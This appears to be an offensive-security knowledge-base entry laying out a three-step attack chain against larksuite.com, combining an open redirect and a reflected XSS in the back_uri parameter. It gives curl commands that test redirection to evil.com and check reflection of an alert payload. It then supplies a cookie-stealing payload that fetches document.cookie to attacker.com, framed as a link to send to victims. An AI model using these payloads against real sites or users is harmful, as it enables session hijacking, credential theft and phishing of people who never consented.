---
tags:
  - xss
  - open-redirect
  - web-vulnerability
  - larksuite
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-test-back_uri-redirect]]'
  - '[[commands/curl-test-back_uri-xss]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Reflected-XSS-in-back_uri]]'
  - '[[procedures/Exploit-Open-Redirect-in-back_uri]]'
step_count: 3
techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-13T23:52:39.527Z'
description: >-
  A multi-stage attack exploiting a reflected XSS and open redirect
  vulnerability in the back_uri parameter to inject JavaScript and redirect
  users to malicious sites.
skill_level: intermediate
impact_level: high
id: 22a13d73-0d5b-4e8f-b129-d721edcdc6bf
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
---
# Reflected XSS and Open Redirect via back_uri Parameter on Larksuite.com

Multi-stage attack chain demonstrating exploitation of reflected XSS and open redirect in the back_uri parameter to execute JavaScript in the victim's browser and redirect to malicious sites.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Victim Accesses Malicious Link] --> B[Open Redirect to Malicious Site]
    B --> C[Reflected XSS Executes JavaScript]
    C --> D[Data Exfiltration or Further Exploitation]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser for testing
- [[commands/curl-test-back_uri-redirect]] for verification

### Target Environment

- Web platform
- Access to larksuite.com
- No specific ports or services required beyond HTTP/HTTPS

### Initial Access Requirements

- Ability to craft and distribute URLs (e.g., via email or social engineering)
- Victim interaction required (clicking the link)
- No prior credentials needed

## Detailed Attack Procedures

### Step 1: Test Parameter Reflection and Redirect
procedure: [[procedures/Exploit-Open-Redirect-in-back_uri]]

**Objective**: Verify the back_uri parameter allows arbitrary redirects without validation, setting up for phishing.

**Instructions**: Use [[commands/curl-test-back_uri-redirect]] to test redirection to a controlled domain:

```bash
curl -L "https://larksuite.com/?back_uri=https://evil.com" -o /dev/null -w "%{http_code} %{url_effective}\n"
```

Observe the HTTP response and effective URL to confirm redirect.

**Expected Output**: HTTP 302 redirect to https://evil.com.

**Success Indicators**:
- Redirect occurs without validation
- No error or blocking on external domains

### Step 2: Inject XSS Payload
procedure: [[procedures/Exploit-Reflected-XSS-in-back_uri]]

**Objective**: Confirm reflection of user input without escaping, allowing JavaScript injection.

**Instructions**: Craft a URL with a test payload and access it in a browser, or use [[commands/curl-test-back_uri-xss]] to inspect response:

```bash
curl "https://larksuite.com/?back_uri=javascript:alert(1)" | grep -i "javascript:alert(1)"
```

If reflected unescaped, proceed to full payload like `javascript:alert(document.cookie)`.

**Expected Output**: Payload appears in HTML response without encoding (e.g., no &lt;script&gt;).

**Success Indicators**:
- Input reflected raw in page source
- Alert or JS execution in browser

### Step 3: Combine for Full Exploitation

**Objective**: Chain redirect and XSS to phish credentials or steal session data.

**Instructions**: Distribute a link like `https://larksuite.com/?back_uri=javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)` to victim. The redirect triggers the page load, reflecting and executing the JS.

**Expected Output**: Victim's browser executes JS, sending data to attacker server.

**Success Indicators**:
- JS payload executes in victim context
- Data exfiltrated to attacker-controlled endpoint

## Attack Chain Summary

### Key Achievements

1. Confirmed open redirect for phishing setup
2. Injected and executed arbitrary JavaScript via reflected XSS
3. Demonstrated potential for session hijacking or credential theft

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Drive-by Compromise]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Initial Access]]

---
*Last updated: 2023-10-01T00:00:00Z*
